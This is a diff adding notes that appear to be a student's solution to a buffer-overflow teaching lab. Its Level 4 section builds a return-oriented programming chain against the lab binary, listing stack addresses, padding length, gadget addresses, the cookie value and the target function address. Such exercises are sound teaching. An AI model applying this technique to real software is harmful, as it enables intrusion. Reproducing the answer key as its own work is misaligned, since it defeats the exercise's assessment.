@@ -99,5 +99,51 @@ exploit string
 0x5561dcb8: 00 00 00 00 00 00 00 00  
 =======================================================
 =================Level 4===============================
+break points                                  %rsp
+test
+(1)0x401971(before call to getbuf)         0x7ffffffcf100
+(2)0x401976(after call to getbuf)          0x7ffffffcf100
+getbuf
+(3)*0x4017a8(first inst of getbuf)         0x7ffffffcf0f8 (location where return address in test is stored) ---> 0x401976
+(4)*0x4017ac(after allocating buf)         0x7ffffffcf0d0 (start address of %rsp in getbuf) --->start of buffer (40 bytes)
+(5)*0x4017b4(after call to Gets)           0x7ffffffcf0d0
+(6)*0x4017bd(just before retq)             0x7ffffffcf0f8
+What we need attack string for this level as follows
+1. first 40 bytes as padding
+2. return address of gadget that pops value from stack into some register say r1
+3. value of cookie
+4. return address of gadget that moves value from register r1 to %rdi
+5. return address of touch2 function.
 
+Step 2
+-------
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+58 - pop %rax
+90 - nop
+c3 return
+so address of this gadget: 0x4019ab
+Step 3
+------
+value of cookie: 0x59b997fa
+
+Step 4
+------
+possible instruction required
+movq %rax, %rdi - 48 89 c7
+retq - c3
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+48 89 c7 - movq %rax, %rdi
+90       - nop
+c3       - retq
+
+so address of this gadget - 0x4019c5
+
+Step 5
+------
+return address of touch2 function: 0x4018fa
 =======================================================
